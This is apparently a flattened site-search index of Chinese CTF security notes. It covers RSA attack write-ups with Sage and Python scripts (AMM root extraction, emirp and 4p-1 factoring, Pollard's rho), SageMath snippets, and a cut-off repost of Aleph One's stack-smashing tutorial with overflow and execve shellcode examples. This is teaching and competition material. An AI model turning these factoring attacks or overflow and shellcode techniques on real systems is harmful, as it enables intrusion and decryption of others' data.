\u8bf4\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5 \u6269\u5c55\u5230\u5f00n\u6b21\u65b9\u6839 \u3002 \u5728\u8fd9\u7bc7 paper \u91cc\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u7b97\u6cd5\uff1a Adleman-Manders-Miller rth Root Extraction Method \u3002 \u8fd9\u4e2a\u7b97\u6cd5\u53ea\u80fd\u5f00\u51fa\u4e00\u4e2a\u6839\uff0c\u5b9e\u9645\u4e0a\u5f00 $$e$$ \u6b21\u65b9\uff0c\u6700\u591a\u4f1a\u6709 $$e$$ \u4e2a\u6839\uff08\u8fd9\u9898\u7684\u60c5\u51b5\u4e0b\u67090x1337\u4e2a\u6839\uff09\u3002 \u5982\u4f55\u627e\u5230\u5176\u4ed6\u6839\uff1f StackOverflow \u2013 Cube root modulo P \u7ed9\u51fa\u4e86\u65b9\u6cd5\u3002 \u5982\u4f55\u627e\u5230\u6240\u6709\u7684 primitive 0x1337th root of 1 ? StackExchange \u2013 Finding the n-th root of unity in a finite field \u7ed9\u51fa\u4e86\u65b9\u6cd5\u3002 Exploit \uff08\u4ee5 e=0x1337 \u200b \u4e3a\u4f8b\uff09 \u5148\u7528 Adleman-Manders-Miller rth Root Extraction Method \u5728 $$\\text{GF}(p)$$ \u548c $$\\text{GF}(q)$$ \u4e0a\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u6839\uff0c\u5206\u522b\u5f97\u5230\u4e00\u4e2a\u89e3\u3002\u5927\u6982\u4e0d\u523010\u79d2\u3002 \u7136\u540e\u53bb\u627e\u5230\u6240\u6709\u7684 0x1336 \u4e2a primitive nth root of 1 \uff0c\u4e58\u4ee5\u4e0a\u9762\u90a3\u4e2a\u89e3\uff0c\u5f97\u5230\u6240\u6709\u7684 0x1337 \u4e2a\u89e3\u3002\u5927\u69821\u5206\u949f\u3002 \u518d\u7528CRT\u5bf9 $$\\text{GF}(p)$$ \u548c $$\\text{GF}(q)$$ \u4e0a\u7684\u4e24\u7ec4 0x1337 \u4e2a\u89e3\u7ec4\u5408\u6210 $$\\bmod n$$ \u4e0b\u7684\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230 0x1337**2=24196561 \u4e2a $$\\bmod n$$ \u7684\u89e3\u3002\u6700\u540e\u80fd\u901a\u8fc7 check() \u7684\u5373\u4e3aflag\u3002\u5927\u6982\u5341\u51e0\u5206\u949f\u3002 #\u811a\u672c1 #Sage import random import time # About 3 seconds to run def AMM(o, r, q): start = time.time() print('\\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:{}'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:{}, t:{}'.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print('[+] Find alp:{}'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - discrete_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(\"Finished in {} seconds.\".format(end - start)) print('Find one solution: {}'.format(result)) return result def findAllPRoot(p, e): print(\"Start to find all the Primitive {:#x}th root of 1 modulo {}.\".format(e, p)) start = time.time() proot = set() while len(proot) < e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return proot def findAllSolutions(mp, proot, cp, p): print(\"Start to find all the {:#x}th root of {} modulo {}.\".format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return all_mp c = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359 p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741 e = 0x1337 cp = c % p cq = c % q mp = AMM(cp, e, p) mq = AMM(cq, e, q) p_proot = findAllPRoot(p, e) q_proot = findAllPRoot(q, e) mps = findAllSolutions(mp, p_proot, cp, p) mqs = findAllSolutions(mq, q_proot, cq, q) print(mps, mqs) def check(m): h = m.hex() if len(h) & 1: return False if bytes.fromhex(h).startswith(b'NCTF'): print(bytes.fromhex(h)) return True else: return False # About 16 mins to run 0x1337^2 == 24196561 times CRT start = time.time() print('Start CRT...') for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) print(time.time() - start) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) #\u811a\u672c2 #Sage c = 346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760 p = 21122913513992623721920275602985463699928507831138027 q = 16471885912035642894544190467774867069446937372970845578732298073 e = 239 P.<a>=PolynomialRing(Zmod(p),implementation='NTL') f=a^e-c mps=f.monic().roots() P.<a>=PolynomialRing(Zmod(q),implementation='NTL') g=a^e-c mqs=g.monic().roots() for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if solution.startswith('666c'): print(solution) \u200b * ##### SMUPE \u95ee\u9898 \uff08\u4e0d\u540cN,e\u52a0\u5bc6\u7ebf\u6027\u5173\u7cfb\u660e\u6587\uff09 a system of univariate polynomial equations problem = \u4e00\u5143\u591a\u9879\u5f0f\u65b9\u7a0b\u7ec4\u6c42\u89e3\u95ee\u9898 \u5b9a\u4e49 $$k$$ \u662f\u4e00\u4e2a\u6574\u6570\uff0c$$N$$ \u4e3a\u6ee1\u8db3RSA\u7b97\u6cd5\u7684\u6a21\u6570\uff0c$$\\delta$$ \u662f\u591a\u9879\u5f0f\u7684\u9636\u3002\u6709 $$N_i<N_{i+1},\\delta_i \\in N\\quad(i=1,2,\\cdots,k)$$ \u591a\u9879\u5f0f\u65b9\u7a0b\u7ec4\u8868\u793a\u5982\u4e0b, \u76ee\u7684\u662f\u6c42\u89e3 $$x$$\uff1a $$\\begin{cases} f_1(x)\\equiv 0 \\pmod {N_1}\\newline f_2(x)\\equiv 0 \\pmod {N_2} \\newline {\\vdots} \\newline f_k(x)\\equiv 0 \\pmod {N_k} \\end{cases}$$ + \u6c42\u89e3\u6761\u4ef6 Alexander May, Maike Ritzenhofent\u63d0\u51fa\u4e00\u79cd\u6c42\u89e3\u65b9\u6cd5\uff0c\u7b80\u5355\u5730\u8bf4\u5f53\u591a\u9879\u5f0f\u7684\u9636 $$\\delta$$ \u6ee1\u8db3\u4ee5\u4e0b\u60c5\u51b5\u65f6\u53ef\u89e3\uff08$$\\delta$$ \u662f\u591a\u9879\u5f0f\u7684\u9636\uff09\uff1a $$\\sum\\limits_{i=1}^k \\cfrac{1}{\\delta_i} \\geq 1$$ \u5177\u4f53\u63cf\u8ff0\uff1a \u4ee4 $$(f_i,\\delta_i,N_i) \\quad(i=1,2,\\cdots,k)$$ \u4f5c\u4e3aSMUPE\u95ee\u9898\u7684\u9996\u4e00\u591a\u9879\u5f0f\u7ec4\uff0c \u5b9a\u4e49 $$M=\\prod\\limits_{i=1}^k N_i^{\\frac{\\delta}{\\delta_i}},\\delta=\\text{lcm}(\\delta_i) \\quad (i=1,2,\\cdots,k)$$ \u5219SMUPE\u95ee\u9898\u53ef\u4ee5\u5728 $$O(\\delta^6\\cdot \\log_2M)$$ \u590d\u6742\u5ea6\u89e3\u51b3\u3002\u53c2\u8003\uff1a 2019\u7ea2\u5e3d\u676f - \u7cbe\u660e\u7684Alice \u200b * ##### \u53cd\u7d20\u6570\uff08emirp\u6570\uff09 \u5df2\u77e5\uff1a$$q=\\text{reverse_x}(p)$$\uff0c$$\\text{x}$$ \u4e3a\u8fdb\u5236\u6570\u3002 \u7206\u7834\u601d\u8def\u7c7b\u4f3cRSA parity oracle\u3002$$p,q$$ \u662fbit\u7ffb\u8f6c\u5173\u7cfb\uff0c\u5df2\u77e5 $$p$$ \u6700\u4f4e\u7684 $$k$$ \u4f4d\uff0c\u5219\u5df2\u77e5 $$q$$ \u6700\u9ad8\u7684 $$k$$ \u4f4d\u3002 \u5047\u8bbe\u5df2\u77e5 $$k$$ \u4f4d\u7684 $$p,q$$\uff0c\u8bb0\u4e3a $$ph,qh$$\uff0c\u5229\u7528\u4e0d\u7b49\u5f0f $$ph\\cdot qh\\cdot 2^{1024-2k}<=n<(ph+1)\\cdot(qh+1)\\cdot 2^{1024-2k}$$ \uff0c \u9010\u4f4d\u5411\u4f4e\u5730\u5740\u7206\u7834\uff0c\u4e0d\u65ad\u6536\u7f29\u4e0d\u7b49\u5f0f\u7684\u8303\u56f4\uff0c\u6700\u7ec8\u53ef\u6c42\u5f97 $$n$$ \u503c\u3002 \u53c2\u8003\uff1a ASIS 2015 Finals: RSASR Midnight Sun CTF 2020 Quals RoarCTF 2020 - Reverse #python2 #x=10 n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543 def t(a, b, k): # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side if k == 77: if a*b == n: print a, b return for i in xrange(10): for j in xrange(10): # we try to guess the last not-already-guessed digits of both primes a1 = a + i*(10**k) + j*(10**(154-k)) b1 = b + j*(10**k) + i*(10**(154-k)) if a1*b1 > n: # a1 and b1 are too large continue if (a1+(10**(154-k)))*(b1+(10**(154-k))) < n: # a1 and b1 are too small continue if ((a1*b1)%(10**(k+1))) != (n%(10**(k+1))): # The last digits of a1*b1 (which won't change later) doesn't match n continue # this a1 and b1 seem to be a possible match, try to guess remaining digits t(a1, b1, k+1) # the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code) for i in xrange(10): t(i*(10**77), i*(10**77), 0) \u200b * ##### 4p-1 method \u5bf9\u4f7f\u7528\u4e00\u7c7b\u7279\u5b9a\u7d20\u6570\u4e58\u79ef\u7684\u6a21\u6570\u7684\u5206\u89e3\u3002 \u5f53\u4e00\u7c7b\u7279\u6b8a\u7684\u7d20\u6570\u7528\u5728 RSA \u6a21\u6570\u4e2d\u65f6\uff0c\u53ef\u4ee5\u8f7b\u6613\u7684\u5c06\u8be5\u7d20\u6570\u4ece $$n$$ \u4e2d\u5206\u89e3\u51fa\u6765\u3002\u7531\u4e8e\u8fd9\u4e00\u7c7b\u7d20\u6570\u90fd\u5f62\u5982 $$4p\u22121=Ds^2$$\uff0c\u56e0\u6b64\u53c8\u88ab\u79f0\u4e3a 4p-1 method \u3002\u6b64\u5916\uff0c\u6709\u4e9b\u4eba\u4e5f\u4f1a\u5c06\u5176\u89c6\u4e3a RSA \u7684\u540e\u95e8\u4e4b\u4e00\uff0c\u79f0\u4e4b\u4e3a RSA backdoor \u3002 QiCheng Prime $$Ds={3,11,19,43,67,163}$$ import sys sys.setrecursionlimit(10^6) def QiCheng(n): R = Integers(n) attempts = 20 js = [0, (-2^5)^3, (-2^5*3)^3, (-2^5*3*5)^3, (-2^5*3*5*11)^3, (-2^6*3*5*23*29)^3] for _ in range(attempts): for j in js: if j == 0: a = R.random_element() E = EllipticCurve([0, a]) else: a = R(j)/(R(1728)-R(j)) c = R.random_element() E = EllipticCurve([3*a*c^2, 2*a*c^3]) x = R.random_element() z = E.division_polynomial(n, x) g = gcd(z, n) if g > 1: return g n = p = int(QiCheng(Integer(n))) + Masaaki Shirase & Vladimir Sedlacek Improvement \u66f4\u591a $$Ds$$ \u503c\u3002 CM-based factorization \u53c2\u8003\uff1a \u6d45\u8c08 QiCheng Prime NCTF 2020 - RSA_revenge CryptoHack Challenge - RSA Backdoor Viability \u200b * ##### Common Prime RSA \u60c5\u5f62\uff1a$$\\gcd(p-1,q-1)=g$$ \u5206\u89e3\u7684n\u65b9\u6cd5\u6709\u56db\u79cd\uff1a \uff081\uff09\u4fee\u6539Pollard\u2019s rho\u65b9\u6cd5\u5206\u89e3n\uff1b \uff082\uff09\u77e5\u9053a\u3001b\u7684\u503c\u5206\u89e3n\uff1b \uff083\uff09\u77e5\u9053g\u7684\u503c\u5206\u89e3n\uff1b \uff084\uff09\u5206\u89e3N-1\u3002 # Pollard\u2019s rho def f(x, n): return (pow(x, n - 1, n) + 3) % n def rho(n): i = 1 print 'Factorizing' while True: x1 = getRandomRange(2, n) x2 = f(x1, n) j = 1 while True: p = gmpy2.gcd(abs(x1 - x2), n) if p == n: break elif p > 1 and isPrime(p): print 'Found!' return (p, n // p) else: x1 = f(x1, n) x2 = f(f(x2, n), n) j += 1 i += 1","title":"\u591a\u7d20\u6570\u56e0\u5b50\uff08Multi-prime RSA\uff09"},{"location":"other/RSA/#_7","text":"\u4e8c\u5341\u5e74\u4ee5\u6765\u5bf9 RSA \u5bc6\u7801\u7cfb\u7edf\u653b\u51fb\u7efc\u8ff0 CTF Wiki - RSA 0xDktb\u2019s Blog RSA\u5e38\u89c1\u653b\u51fb\u65b9\u6cd5 Cryptanalysis of RSA and It\u2019s Variants \u539f\u6587\u94fe\u63a5\uff1a https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html","title":"\u8be6\u7ec6\u539f\u7406"},{"location":"other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/","text":"1.sagemath\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570 x=discrete_log(mod(13,23),mod(2,23)) #\u6216discrete_log(13,mod(2,23)) print(x) 2.sagemath\u6c42\u9006\u5143 # a\u2217b\u22611(mod p) b=inverse_mod(a,p) print(a*b%p) #1 print(b)#\u6c42\u9006\u5143 3.sagemath\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 d,u,v=xgcd(20,30) print(\"d:{0} u:{1} v:{2}\".format(d,u,v)) #d:10 u:-1 v:1 4.sagemath\u5b59\u5b50\u5b9a\u7406(\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406) def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prod chinese_remainder([3,5,7],[2,3,2]) #23 5.sagemath\u6c42\u6b27\u62c9\u51fd\u6570 print(euler_phi(60)) #16 \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/08/13/sagemath\u5e38\u7528\u51fd\u6570/","title":"SageMath\u5e38\u7528\u51fd\u6570"},{"location":"other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/#1sagemath","text":"x=discrete_log(mod(13,23),mod(2,23)) #\u6216discrete_log(13,mod(2,23)) print(x)","title":"1.sagemath\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570"},{"location":"other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/#2sagemath","text":"# a\u2217b\u22611(mod p) b=inverse_mod(a,p) print(a*b%p) #1 print(b)#\u6c42\u9006\u5143","title":"2.sagemath\u6c42\u9006\u5143"},{"location":"other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/#3sagemath","text":"d,u,v=xgcd(20,30) print(\"d:{0} u:{1} v:{2}\".format(d,u,v)) #d:10 u:-1 v:1","title":"3.sagemath\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5"},{"location":"other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/#4sagemath","text":"def chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prod chinese_remainder([3,5,7],[2,3,2]) #23","title":"4.sagemath\u5b59\u5b50\u5b9a\u7406(\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406)"},{"location":"other/SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/#5sagemath","text":"print(euler_phi(60)) #16 \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/08/13/sagemath\u5e38\u7528\u51fd\u6570/","title":"5.sagemath\u6c42\u6b27\u62c9\u51fd\u6570"},{"location":"other/Smashing%20the%20Stack%20for%20Fun%20and%20Profit%20by%20Aleph%20One/","text":"Smashing the Stack for Fun and Profit by Aleph One .oO Phrack 49 Oo. Volume Seven, Issue Forty-Nine File 14 of 16 BugTraq, r00t, and Underground.Org bring you XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Smashing The Stack For Fun And Profit XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX by Aleph One aleph1@underground.org `smash the stack` [C programming] n. On many C implementations it is possible to corrupt the execution stack by writing past the end of an array declared auto in a routine. Code that does this is said to smash the stack, and can cause return from the routine to jump to a random address. This can produce some of the most insidious data-dependent bugs known to mankind. Variants include trash the stack, scribble the stack, mangle the stack; the term mung the stack is not used, as this is never done intentionally. See spam; see also alias bug, fandango on core, memory leak, precedence lossage, overrun screw. Introduction ~~~~~~~~~~~~ Over the last few months there has been a large increase of buffer overflow vulnerabilities being both discovered and exploited. Examples of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at, etc. This paper attempts to explain what buffer overflows are, and how their exploits work. Basic knowledge of assembly is required. An understanding of virtual memory concepts, and experience with gdb are very helpful but not necessary. We also assume we are working with an Intel x86 CPU, and that the operating system is Linux. Some basic definitions before we begin: A buffer is simply a contiguous block of computer memory that holds multiple instances of the same data type. C programmers normally associate with the word buffer arrays. Most commonly, character arrays. Arrays, like all variables in C, can be declared either static or dynamic. Static variables are allocated at load time on the data segment. Dynamic variables are allocated at run time on the stack. To overflow is to flow, or fill over the top, brims, or bounds. We will concern ourselves only with the overflow of dynamic buffers, otherwise known as stack-based buffer overflows. Process Memory Organization ~~~~~~~~~~~~~~~~~~~~~~~~~~~ To understand what stack buffers are we must first understand how a process is organized in memory. Processes are divided into three regions: Text, Data, and Stack. We will concentrate on the stack region, but first a small overview of the other regions is in order. The text region is fixed by the program and includes code (instructions) and read-only data. This region corresponds to the text section of the executable file. This region is normally marked read-only and any attempt to write to it will result in a segmentation violation. The data region contains initialized and uninitialized data. Static variables are stored in this region. The data region corresponds to the data-bss sections of the executable file. Its size can be changed with the brk(2) system call. If the expansion of the bss data or the user stack exhausts available memory, the process is blocked and is rescheduled to run again with a larger memory space. New memory is added between the data and stack segments. /------------------\\ lower | | memory | Text | addresses | | |------------------| | (Initialized) | | Data | | (Uninitialized) | |------------------| | | | Stack | higher | | memory \\------------------/ addresses Fig. 1 Process Memory Regions What Is A Stack? ~~~~~~~~~~~~~~~~ A stack is an abstract data type frequently used in computer science. A stack of objects has the property that the last object placed on the stack will be the first object removed. This property is commonly referred to as last in, first out queue, or a LIFO. Several operations are defined on stacks. Two of the most important are PUSH and POP. PUSH adds an element at the top of the stack. POP, in contrast, reduces the stack size by one by removing the last element at the top of the stack. Why Do We Use A Stack? ~~~~~~~~~~~~~~~~~~~~~~ Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the procedure or function. From one point of view, a procedure call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to dynamically allocate the local variables used in functions, to pass parameters to the functions, and to return values from the function. The Stack Region ~~~~~~~~~~~~~~~~ A stack is a contiguous block of memory containing data. A register called the stack pointer (SP) points to the top of the stack. The bottom of the stack is at a fixed address. Its size is dynamically adjusted by the kernel at run time. The CPU implements instructions to PUSH onto and POP off of the stack. The stack consists of logical stack frames that are pushed when calling a function and popped when returning. A stack frame contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call. Depending on the implementation the stack will either grow down (towards lower memory addresses), or up. In our examples we'll use a stack that grows down. This is the way the stack grows on many computers including the Intel, Motorola, SPARC and MIPS processors. The stack pointer (SP) is also implementation dependent. It may point to the last address on the stack, or to the next free available address after the stack. For our discussion we'll assume it points to the last address on the stack. In addition to the stack pointer, which points to the top of the stack (lowest numerical address), it is often convenient to have a frame pointer (FP) which points to a fixed location within a frame. Some texts also refer to it as a local base pointer (LB). In principle, local variables could be referenced by giving their offsets from SP. However, as words are pushed onto the stack and popped from the stack, these offsets change. Although in some cases the compiler can keep track of the number of words on the stack and thus correct the offsets, in some cases it cannot, and in all cases considerable administration is required. Futhermore, on some machines, such as Intel-based processors, accessing a variable at a known distance from SP requires multiple instructions. Consequently, many compilers use a second register, FP, for referencing both local variables and parameters because their distances from FP do not change with PUSHes and POPs. On Intel CPUs, BP (EBP) is used for this purpose. On the Motorola CPUs, any address register except A7 (the stack pointer) will do. Because the way our stack grows, actual parameters have positive offsets and local variables have negative offsets from FP. The first thing a procedure must do when called is save the previous FP (so it can be restored at procedure exit). Then it copies SP into FP to create the new FP, and advances SP to reserve space for the local variables. This code is called the procedure prolog. Upon procedure exit, the stack must be cleaned up again, something called the procedure epilog. The Intel ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, have been provided to do most of the procedure prolog and epilog work efficiently. Let us see what the stack looks like in a simple example: example1.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; } void main() { function(1,2,3); } ------------------------------------------------------------------------------ To understand what the program does to call function() we compile it with gcc using the -S switch to generate assembly code output: $ gcc -S -o example1.s example1.c By looking at the assembly language output we see that the call to function() is translated to: pushl $3 pushl $2 pushl $1 call function This pushes the 3 arguments to function backwards into the stack, and calls function(). The instruction 'call' will push the instruction pointer (IP) onto the stack. We'll call the saved IP the return address (RET). The first thing done in function is the procedure prolog: pushl %ebp movl %esp,%ebp subl $20,%esp This pushes EBP, the frame pointer, onto the stack. It then copies the current SP onto EBP, making it the new FP pointer. We'll call the saved FP pointer SFP. It then allocates space for the local variables by subtracting their size from SP. We must remember that memory can only be addressed in multiples of the word size. A word in our case is 4 bytes, or 32 bits. So our 5 byte buffer is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer is going to take 12 bytes (3 words) of memory. That is why SP is being subtracted by 20. With that in mind our stack looks like this when function() is called (each space represents a byte): bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Buffer Overflows ~~~~~~~~~~~~~~~~ A buffer overflow is the result of stuffing more data into a buffer than it can handle. How can this often found programming error can be taken advantage to execute arbitrary code? Lets look at another example: example2.c ------------------------------------------------------------------------------ void function(char *str) { char buffer[16]; strcpy(buffer,str); } void main() { char large_string[256]; int i; for( i = 0; i < 255; i++) large_string[i] = 'A'; function(large_string); } ------------------------------------------------------------------------------ This is program has a function with a typical buffer overflow coding error. The function copies a supplied string without bounds checking by using strcpy() instead of strncpy(). If you run this program you will get a segmentation violation. Lets see what its stack looks when we call function: bottom of top of memory memory buffer sfp ret *str <------ [ ][ ][ ][ ] top of bottom of stack stack What is going on here? Why do we get a segmentation violation? Simple. strcpy() is coping the contents of *str (larger_string[]) into buffer[] until a null character is found on the string. As we can see buffer[] is much smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means that all 250 bytes after buffer in the stack are being overwritten. This includes the SFP, RET, and even *str! We had filled large_string with the character 'A'. It's hex character value is 0x41. That means that the return address is now 0x41414141. This is outside of the process address space. That is why when the function returns and tries to read the next instruction from that address you get a segmentation violation. So a buffer overflow allows us to change the return address of a function. In this way we can change the flow of execution of the program. Lets go back to our first example and recall what the stack looked like: bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Lets try to modify our first example so that it overwrites the return address, and demonstrate how we can make it execute arbitrary code. Just before buffer1[] on the stack is SFP, and before it, the return address. That is 4 bytes pass the end of buffer1[]. But remember that buffer1[] is really 2 word so its 8 bytes long. So the return address is 12 bytes from the start of buffer1[]. We'll modify the return value in such a way that the assignment statement 'x = 1;' after the function call will be jumped. To do so we add 8 bytes to the return address. Our code is now: example3.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; int *ret; ret = buffer1 + 12; (*ret) += 8; } void main() { int x; x = 0; function(1,2,3); x = 1; printf(\"%d\\n\",x); } ------------------------------------------------------------------------------ What we have done is add 12 to buffer1[]'s address. This new address is where the return address is stored. We want to skip pass the assignment to the printf call. How did we know to add 8 to the return address? We used a test value first (for example 1), compiled the program, and then started gdb: ------------------------------------------------------------------------------ [aleph1]$ gdb example3 GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble main Dump of assembler code for function main: 0x8000490 <main>: pushl %ebp 0x8000491 <main+1>: movl %esp,%ebp 0x8000493 <main+3>: subl $0x4,%esp 0x8000496 <main+6>: movl $0x0,0xfffffffc(%ebp) 0x800049d <main+13>: pushl $0x3 0x800049f <main+15>: pushl $0x2 0x80004a1 <main+17>: pushl $0x1 0x80004a3 <main+19>: call 0x8000470 <function> 0x80004a8 <main+24>: addl $0xc,%esp 0x80004ab <main+27>: movl $0x1,0xfffffffc(%ebp) 0x80004b2 <main+34>: movl 0xfffffffc(%ebp),%eax 0x80004b5 <main+37>: pushl %eax 0x80004b6 <main+38>: pushl $0x80004f8 0x80004bb <main+43>: call 0x8000378 <printf> 0x80004c0 <main+48>: addl $0x8,%esp 0x80004c3 <main+51>: movl %ebp,%esp 0x80004c5 <main+53>: popl %ebp 0x80004c6 <main+54>: ret 0x80004c7 <main+55>: nop ------------------------------------------------------------------------------ We can see that when calling function() the RET will be 0x8004a8, and we want to jump past the assignment at 0x80004ab. The next instruction we want to execute is the at 0x8004b2. A little math tells us the distance is 8 bytes. Shell Code ~~~~~~~~~~ So now that we know that we can modify the return address and the flow of execution, what program do we want to execute? In most cases we'll simply want the program to spawn a shell. From the shell we can then issue other commands as we wish. But what if there is no such code in the program we are trying to exploit? How can we place arbitrary instruction into its address space? The answer is to place the code with are trying to execute in the buffer we are overflowing, and overwrite the return address so it points back into the buffer. Assuming the stack starts at address 0xFF, and that S stands for the code we want to execute the stack would then look like this: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03] ^ | |____________________________| top of bottom of stack stack The code to spawn a shell in C looks like: shellcode.c ----------------------------------------------------------------------------- #include <stdio.h> void main() { char *name[2]; name[0] = \"/bin/sh\"; name[1] = NULL; execve(name[0], name, NULL); } ------------------------------------------------------------------------------ To find out what does it looks like in assembly we compile it, and start up gdb. Remember to use the -static flag. Otherwise the actual code the for the execve system call will not be included. Instead there will be a reference to dynamic C library that would normally would be linked in at load time. ------------------------------------------------------------------------------ [aleph1]$ gcc -o shellcode -ggdb -static shellcode.c [aleph1]$ gdb shellcode GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (gdb) disassemble main Dump of assembler code for function main: 0x8000130 <main>: pushl %ebp 0x8000131 <main+1>: movl %esp,%ebp 0x8000133 <main+3>: subl $0x8,%esp 0x8000136 <main+6>: movl $0x80027b8,0xfffffff8(%ebp) 0x800013d <main+13>: movl $0x0,0xfffffffc(%ebp) 0x8000144 <main+20>: pushl $0x0 0x8000146 <main+22>: leal 0xfffffff8(%ebp),%eax 0x8000149 <main+25>: pushl %eax 0x800014a <main+26>: movl 0xfffffff8(%ebp),%eax 0x800014d <main+29>: pushl %eax 0x800014e <main+30>: call 0x80002bc <__execve> 0x8000153 <main+35>: addl $0xc,%esp 0x8000156 <main+38>: movl %ebp,%esp 0x8000158 <main+40>: popl %ebp 0x8000159 <main+41>: ret End of assembler dump. (gdb) disassemble __execve Dump of assembler code for function __execve: 0x80002bc <__execve>: pushl %ebp 0x80002bd <__execve+1>: movl %esp,%ebp 0x80002bf <__execve+3>: pushl %ebx 0x80002c0 <__execve+4>: movl $0xb,%eax 0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx 0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx 0x80002cb <__execve+15>: movl 0x10(%ebp),%edx 0x80002ce <__execve+18>: int $0x80 0x80002d0 <__execve+20>: movl %eax,%edx 0x80002d2 <__execve+22>: testl %edx,%edx 0x80002d4 <__execve+24>: jnl 0x80002e6 <__execve+42> 0x80002d6 <__execve+26>: negl %edx 0x80002d8 <__execve+28>: 